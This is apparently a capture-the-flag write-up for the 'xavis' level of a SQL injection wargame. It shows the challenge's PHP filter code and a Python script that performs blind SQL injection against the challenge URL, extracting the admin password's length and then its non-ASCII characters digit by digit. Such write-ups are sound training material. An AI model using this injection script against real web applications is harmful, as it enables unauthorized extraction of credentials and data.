# xavis

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

Here we have to bruteforce the password. But when we brute force normally we are not getting the password. So we suspect the password is not just made of english alphabets. So I wrote a script for that

```python
import requests
import string
import codecs

session = requests.Session()

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or (length(pw)={});%23"
cookies = {"PHPSESSID": "t7lk6agpg5227q87cropdh21bo"}
for i in range(100):
   print(i,url.format(i))
   r=requests.get(url.format(i),cookies=cookies)
   if('Hello admin' in r.text[:200]):
       leng=i
       print("Length", i)
       break

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or id='admin' and (substr(ord(substr(pw,{},1)),{},1)='{}');%23"
w=""
for i in range(1,leng+1):
    pw=""
    for j in range(1,6):
        for k in "0123456789":
            print(i,url.format(i,j,k))
            r = requests.get(url.format(i,j,k), cookies=cookies)
            if('Hello admin' in r.text[:200]):
                pw += k
                print("wtf :", pw)
                break
    w+=chr(int(pw))
    print(pw,w)
print("Password :",w)
```


It gave the password as `우왕굳` and giving that in the url solved the level
